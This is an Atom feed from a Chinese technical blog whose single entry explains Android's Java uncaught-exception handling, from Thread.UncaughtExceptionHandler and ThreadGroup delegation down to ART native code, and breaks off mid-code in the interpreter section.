<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>龙心之火</title>
  <icon>https://www.gravatar.com/avatar/6a279c8af5ea6deaab208f3ed9be6884</icon>
  <subtitle>Lxzh&#39;s Notes</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.lxzh.app/"/>
  <updated>2019-11-21T17:39:25.012Z</updated>
  <id>http://blog.lxzh.app/</id>
  
  <author>
    <name>lxzh</name>
    <email>1239848066@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android中Java的异常处理机制</title>
    <link href="http://blog.lxzh.app/2019/11/22/Android-Java-Crash/"/>
    <id>http://blog.lxzh.app/2019/11/22/Android-Java-Crash/</id>
    <published>2019-11-21T17:30:02.000Z</published>
    <updated>2019-11-21T17:39:25.012Z</updated>
    
    <content type="html"><![CDATA[<p>Android中，Java虚拟机（JVM）是如何处理异常的呢？</p><p>在执行main函数的时候，如果运行过程中遇到异常问题，有两种情况：</p><ol><li>通过try-catch捕获已知或者未知的异常将问题处理并跳过，然后继续运行，确保程序不会崩溃</li><li>但并非所有的异常都是可预知的，针对没有捕获到的异常，会一直向上抛，异常一旦被<code>Thread.run()</code>或主线程抛出后就不能在程序中对异常进行捕获，最终只能由JVM捕获由JVM来处理</li></ol><p>JVM有一个默认的异常处理机制，遇到异常，抛出异常，和打印异常信息，同时将程序停止运行，这就是我们看到的程序崩溃。</p><p>Java的Thread类中有一个UncaughtExceptionHandler接口，该接口的作用主要是为了<strong>当Thread因未捕获的异常而突然终止时，调用处理程序处理异常</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UncaughtExceptionHandler接口唯一的回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uncaughtException</span><span class="params">(Thread t, Throwable e)</span></span>;</span><br><span class="line"><span class="comment">//设置当前线程的异常处理器</span></span><br><span class="line">Thread.setUncaughtExceptionHandler</span><br><span class="line"><span class="comment">//设置所有线程的默认异常处理器</span></span><br><span class="line">Thread.setDefaultUncaughtExceptionHandler</span><br><span class="line"><span class="comment">//设置所有线程的默认异常预处理器</span></span><br><span class="line">Thread.setUncaughtExceptionPreHandler</span><br></pre></td></tr></table></figure><p>JVM遇到线程未捕获的异常后，通过Thread的dispatchUncaughtException(e)方法分发异常到当前线程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// art/runtime/thread.cc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Thread::HandleUncaughtExceptions(ScopedObjectAccessAlreadyRunnable&amp; soa) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Call the Thread instance's dispatchUncaughtException(Throwable)</span></span><br><span class="line">    tlsPtr_.jni_env-&gt;CallVoidMethod(peer.get(),</span><br><span class="line">        WellKnownClasses::java_lang_Thread_dispatchUncaughtException,</span><br><span class="line">        exception.get());</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>java_lang_Thread_dispatchUncaughtException</code>方法就是Thread中的dispatchUncaughtException方法的缓存:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//art/runtime/well_known_classes.cc</span></span><br><span class="line">java_lang_Thread_dispatchUncaughtException = CacheMethod(env, java_lang_Thread, <span class="literal">false</span>, <span class="string">"dispatchUncaughtException"</span>, <span class="string">"(Ljava/lang/Throwable;)V"</span>);</span><br></pre></td></tr></table></figure><p>Thread的dispatchUncaughtException方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">dispatchUncaughtException</span><span class="params">(Throwable e)</span> </span>&#123;</span><br><span class="line">    Thread.UncaughtExceptionHandler initialUeh =</span><br><span class="line">            Thread.getUncaughtExceptionPreHandler();</span><br><span class="line">    <span class="keyword">if</span> (initialUeh != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            initialUeh.uncaughtException(<span class="keyword">this</span>, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ignored) &#123;</span><br><span class="line">            <span class="comment">// Throwables thrown by the initial handler are ignored</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getUncaughtExceptionHandler().uncaughtException(<span class="keyword">this</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有2个UncaughtExceptionHandler会参与处理，分别是PreHandler和Handler，核心是执行其各自实现的uncaughtException方法。</p><p>Android中提供了此二者的默认实现。Android系统中，应用进程由Zygote进程孵化而来，Zygote进程启动时，zygoteInit方法中会调用RuntimeInit.commonInit，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The main function called when started through the zygote process...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Runnable <span class="title">zygoteInit</span><span class="params">(<span class="keyword">int</span> targetSdkVersion, String[] argv, ClassLoader classLoader)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    RuntimeInit.commonInit();</span><br><span class="line">    ZygoteInit.nativeZygoteInit();</span><br><span class="line">    <span class="keyword">return</span> RuntimeInit.applicationInit(targetSdkVersion, argv, classLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// frameworks/base/core/java/com/android/internal/os/RuntimeInit.java</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">commonInit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set handlers; these apply to all threads in the VM. Apps can replace</span></span><br><span class="line"><span class="comment">     * the default handler, but not the pre handler.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    LoggingHandler loggingHandler = <span class="keyword">new</span> LoggingHandler();</span><br><span class="line">    Thread.setUncaughtExceptionPreHandler(loggingHandler);</span><br><span class="line">    Thread.setDefaultUncaughtExceptionHandler(<span class="keyword">new</span> KillApplicationHandler(loggingHandler));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在commonInit方法中实例化了2个对象，分别是<code>LoggingHandler</code>和<code>KillApplicationHandler</code>，均实现了Thread.UncaughtExceptionHandler接口。其中：</p><ol><li>LoggingHandler负责打印异常信息，包括进程名，pid，Java栈信息等</li></ol><ul><li>系统进程，日志以<code>&quot;*** FATAL EXCEPTION IN SYSTEM PROCESS: &quot;</code>开头</li><li>应用进程，日志以<code>&quot;FATAL EXCEPTION: &quot;</code>开头</li></ul><ol start="2"><li>KillApplicationHandler检查日志是否已打印，通知AMS应用Crash，并杀死当前进程。</li></ol><p><strong>注意1：</strong></p><ul><li>Android N及之前版本，只有一个UncaughtHandler类</li><li>Android O及之后版本，进行了功能拆分，拆为LoggingHandler和KillApplicationHandler，回调方法uncaughtException实现如下：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uncaughtException</span><span class="params">(Thread t, Throwable e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ensureLogging(t, e);</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// Bring up crash dialog, wait for it to be dismissed</span></span><br><span class="line">            ActivityManager.getService().handleApplicationCrash(</span><br><span class="line">                    mApplicationObject, <span class="keyword">new</span> ApplicationErrorReport.ParcelableCrashInfo(e));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t2) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// Try everything to make sure this process goes away.</span></span><br><span class="line">            Process.killProcess(Process.myPid());</span><br><span class="line">            System.exit(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注意2：</strong></p><ul><li><p>Thread.setDefaultUncaughtExceptionHandler是公开API。应用可通过调用，自定义UncaughtExceptionHandler，替换掉KillApplicationHandler，这样能自定义逻辑处理掉异常，避免闪退发生</p></li><li><p>Thread.setUncaughtExceptionPreHandler是hidden API。应用不能直接，确保异常发生时能够正常打印异常日志，参考<code>Thread.java</code>的更新日志：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add a new @hide API to set an additional UncaughtExceptionHandler that is called before dispatching to the regular handler. The framework uses this to enforce logging.</span><br></pre></td></tr></table></figure><p>Android O及以后版本，对于任何一个线程异常，会优先经过getUncaughtExceptionPreHandler方法获取<strong>异常预处理器</strong>处理, 然后通过getUncaughtExceptionHandler方法获取当前线程实例的异常处理器处理异常。</p><p>Thread的getUncaughtExceptionHandler方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UncaughtExceptionHandler <span class="title">getUncaughtExceptionHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uncaughtExceptionHandler != <span class="keyword">null</span> ?</span><br><span class="line">        uncaughtExceptionHandler : group;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当前线程没有设置异常处理器，会选择当前线程所在的ThreadGroup（ThreadGroup是一个Thread的集合，自己实现了UncaughtExceptionHandler接口）来处理异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uncaughtException</span><span class="params">(Thread t, Throwable e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">        parent.uncaughtException(t, e);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Thread.UncaughtExceptionHandler ueh = Thread.getDefaultUncaughtExceptionHandler();</span><br><span class="line">        <span class="keyword">if</span> (ueh != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ueh.uncaughtException(t, e);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(e <span class="keyword">instanceof</span> ThreadDeath)) &#123;</span><br><span class="line">            System.err.print(<span class="string">"Exception in thread \""</span> + t.getName() + <span class="string">"\" "</span>);</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ThreadGroup的uncaughtException回调中会通过getDefaultUncaughtExceptionHandler接口获取<strong>默认的线程异常处理器</strong>进行最后的异常处理。</p><p>综上所述，当JVM遇到未捕获的异常时：</p><ol><li>首先经所有线程共有的<code>异常预处理器</code>处理</li><li><code>线程异常预处理器处理</code>预处理后交给当前线程的<code>异常处理器</code>处理</li><li>如果当前线程没有设置异常处理器，就转交给线程所在的线程组<code>ThreadGroup</code>来处理</li><li>线程组委托给<code>父线程组</code>处理，依次向上委托</li><li>最后在<code>根线程组</code>中获取线程共有的<code>默认异常处理器</code>来处理异常</li></ol><p>以上流程总结如下图所示：<br><img src="http://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1574357715891.png" width="800"></p><p><strong>注意：</strong></p><p>Android中如果我们仅仅通过setDefaultUncaughtExceptionHandler方法覆盖默认的异常处理器，在回调中收集异常信息时，一定要注意记得杀死当前进程（让它痛快的死去）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Process.killProcess(Process.myPid());</span><br><span class="line">System.exit(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>不然应用就会陷入卡死状态，无法响应界面操作，进入了<strong>生不如死</strong>的状态。</p><h3 id="附：Java中出现Crash在JVM中的响应机制"><a href="#附：Java中出现Crash在JVM中的响应机制" class="headerlink" title="附：Java中出现Crash在JVM中的响应机制"></a><strong>附</strong>：Java中出现Crash在JVM中的响应机制</h3><p>通过上面的分析，我们知道出现Crash时，JVM是通过<code>Thread::HandleUncaughtExceptions</code>方法将异常从Native层传递到Java层来逐层分发处理。</p><p>那么HandleUncaughtExceptions方法这个方法到底是在哪里调用的呢？搜索整个Android源码，我们只能找到一处调用，也即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Thread::Destroy() &#123;</span><br><span class="line">    Thread* self = <span class="keyword">this</span>;</span><br><span class="line">    DCHECK_EQ(self, Thread::Current());</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (tlsPtr_.opeer != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="function">ScopedObjectAccess <span class="title">soa</span><span class="params">(self)</span></span>;</span><br><span class="line">      <span class="comment">// We may need to call user-supplied managed code, do this before final clean-up.</span></span><br><span class="line">      HandleUncaughtExceptions(soa);</span><br><span class="line">      RemoveFromThreadGroup(soa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这个Destroy()又是在什么时候调用呢？</strong></p><p>通过搜索自然能够找到，如下图所示：</p><img src="http://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1574357780097.png" width="400"><p>但不够直观理解。这里有一份Crash后打印的Native层堆栈信息(这个堆栈信息平时应该比较常见)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#23  pc 0000000000389c19  /system/lib/libart.so (art::Thread::HandleUncaughtExceptions(art::ScopedObjectAccessAlreadyRunnable&amp;)+280)</span><br><span class="line">#24  pc 0000000000389275  /system/lib/libart.so (art::Thread::Destroy()+1128)</span><br><span class="line">#25  pc 00000000003982b1  /system/lib/libart.so (art::ThreadList::Unregister(art::Thread*)+104)</span><br><span class="line">#26  pc 000000000037f209  /system/lib/libart.so (art::Thread::CreateCallback(void*)+1612)</span><br><span class="line">#27  pc 0000000000048811  /system/lib/libc.so (__pthread_start(void*)+24)</span><br><span class="line">#28  pc 000000000001b369  /system/lib/libc.so (__start_thread+32)</span><br></pre></td></tr></table></figure><p>其中art::Thread::CreateCallback方法如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* Thread::CreateCallback(<span class="keyword">void</span>* arg) &#123;</span><br><span class="line">   Thread* self = <span class="keyword">reinterpret_cast</span>&lt;Thread*&gt;(arg);</span><br><span class="line">   Runtime* runtime = Runtime::Current();</span><br><span class="line">   <span class="keyword">if</span> (runtime == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">     LOG(ERROR) &lt;&lt; <span class="string">"Thread attaching to non-existent runtime: "</span> &lt;&lt; *self;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="function">ScopedObjectAccess <span class="title">soa</span><span class="params">(self)</span></span>;</span><br><span class="line">     self-&gt;InitStringEntryPoints();</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">     runtime-&gt;GetRuntimeCallbacks()-&gt;ThreadStart(self);</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// Invoke the 'run' method of our java.lang.Thread.</span></span><br><span class="line">     ObjPtr&lt;mirror::Object&gt; receiver = self-&gt;tlsPtr_.opeer;</span><br><span class="line">     jmethodID mid = WellKnownClasses::java_lang_Thread_run;</span><br><span class="line">     ScopedLocalRef&lt;jobject&gt; ref(soa.Env(), soa.AddLocalReference&lt;jobject&gt;(receiver));</span><br><span class="line">     InvokeVirtualOrInterfaceWithJValues(soa, ref.get(), mid, <span class="literal">nullptr</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Detach and delete self.</span></span><br><span class="line">   Runtime::Current()-&gt;GetThreadList()-&gt;Unregister(self);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>Android Java中的Thread类通过start启动一个线程时，会通过一个native函数<code>nativeCreate</code>进入jni层完成真正的线程创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Android-changed: Use Android specific nativeCreate() method to create/start thread.</span></span><br><span class="line">        <span class="comment">// start0();</span></span><br><span class="line">        nativeCreate(<span class="keyword">this</span>, stackSize, daemon);</span><br><span class="line">        started = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>nativeCreate</code>方法接着会调用到<code>art::Thread::CreateNativeThread</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// art/runtime/native/java_lang_Thread.cc</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Thread_nativeCreate</span><span class="params">(JNIEnv* env, jclass, jobject java_thread, jlong stack_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  jboolean daemon)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// There are sections in the zygote that forbid thread creation.</span></span><br><span class="line">    Runtime* runtime = Runtime::Current();</span><br><span class="line">    <span class="keyword">if</span> (runtime-&gt;IsZygote() &amp;&amp; runtime-&gt;IsZygoteNoThreadSection()) &#123;</span><br><span class="line">      jclass internal_error = env-&gt;FindClass(<span class="string">"java/lang/InternalError"</span>);</span><br><span class="line">      CHECK(internal_error != nullptr);</span><br><span class="line">      env-&gt;ThrowNew(internal_error, <span class="string">"Cannot create threads in zygote"</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    Thread::CreateNativeThread(env, java_thread, stack_size, daemon == JNI_TRUE);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>JVM在<code>art::Thread::CreateNativeThread</code>方法中通过<code>pthread_create</code>创建Native层的线程，并回调<code>CreateCallback</code>接口，其中<code>{}</code>括起来的代码块中调用了Java层Thread的run方法，进入java层Thread的线程循环。</p><p>正常情况下对于主线程而言这里的run方法里会进入死循环，也就是当前的主线程ActivityThread的main函数中的Loop.loop()。</p><p>一旦主线程中出现未捕获的异常，就会跳出主线程循环，从而离开这里的代码块，回调<code>art::ThreadList::Unregister</code>方法，然后调用<code>art::Thread::Destroy</code>方法，最后通过<code>HandleUncaughtExceptions</code>方法分发异常， 这也正好与上文中的异常堆栈吻合。</p><br>**现在又问题来了，为什么出现异常就会退出这个线程循环呢？**<p>这个问题要从Java的字节码指令执行上说起，首先我们举个简单的例子，crash()方法中触发一个简单的除零异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crash</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">crash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中crash方法的smali代码如下:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> crash()V</span><br><span class="line"><span class="keyword">    .registers</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 5</span><br><span class="line">   <span class="built_in"> const/16 </span>v0, 0xa</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> div-int/lit8 </span>v0, v0, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 6</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"i"</span>:I</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><p>关于Java代码在dalvik与art中的执行，这里暂不详细展开。这个除法操作编译后转换为了一条div-int指令，当虚拟机需要执行这个语句时，首先会去解释这个语句，通过字符串匹配的形式找到对应的指令代码，这条语句对应<code>DIV_INT_LIT8</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//art/libdexfile/dex/dex_instruction_list.h</span></span><br><span class="line">...</span><br><span class="line">V(<span class="number">0xD3</span>, DIV_INT_LIT16, <span class="string">"div-int/lit16"</span>, k22s, kIndexNone, kContinue | kThrow, kDivide | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD4</span>, REM_INT_LIT16, <span class="string">"rem-int/lit16"</span>, k22s, kIndexNone, kContinue | kThrow, kRemainder | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD5</span>, AND_INT_LIT16, <span class="string">"and-int/lit16"</span>, k22s, kIndexNone, kContinue, kAnd | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD6</span>, OR_INT_LIT16, <span class="string">"or-int/lit16"</span>, k22s, kIndexNone, kContinue, kOr | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD7</span>, XOR_INT_LIT16, <span class="string">"xor-int/lit16"</span>, k22s, kIndexNone, kContinue, kXor | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD8</span>, ADD_INT_LIT8, <span class="string">"add-int/lit8"</span>, k22b, kIndexNone, kContinue, kAdd | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xD9</span>, RSUB_INT_LIT8, <span class="string">"rsub-int/lit8"</span>, k22b, kIndexNone, kContinue, kSubtract | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDA</span>, MUL_INT_LIT8, <span class="string">"mul-int/lit8"</span>, k22b, kIndexNone, kContinue, kMultiply | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDB</span>, DIV_INT_LIT8, <span class="string">"div-int/lit8"</span>, k22b, kIndexNone, kContinue | kThrow, kDivide | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDC</span>, REM_INT_LIT8, <span class="string">"rem-int/lit8"</span>, k22b, kIndexNone, kContinue | kThrow, kRemainder | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDD</span>, AND_INT_LIT8, <span class="string">"and-int/lit8"</span>, k22b, kIndexNone, kContinue, kAnd | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDE</span>, OR_INT_LIT8, <span class="string">"or-int/lit8"</span>, k22b, kIndexNone, kContinue, kOr | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xDF</span>, XOR_INT_LIT8, <span class="string">"xor-int/lit8"</span>, k22b, kIndexNone, kContinue, kXor | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xE0</span>, SHL_INT_LIT8, <span class="string">"shl-int/lit8"</span>, k22b, kIndexNone, kContinue, kShl | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">V(<span class="number">0xE1</span>, SHR_INT_LIT8, <span class="string">"shr-int/lit8"</span>, k22b, kIndexNone, kContinue, kShr | kRegCFieldOrConstant, kVerifyRegA | kVerifyRegB) \</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>DIV_INT_LIT8</code>方法继而调用<code>DoIntDivide</code>方法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// art/runtime/interpreter/interpreter_switch_impl-inl.h</span></span><br><span class="line"></span><br><span class="line"> <span class="function">ALWAYS_INLINE <span class="keyword">void</span> <span class="title">DIV_INT_LIT8</span><span class="params">()</span> <span class="title">REQUIRES_SHARED</span><span class="params">(Locks::mutator_lock_)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> success = 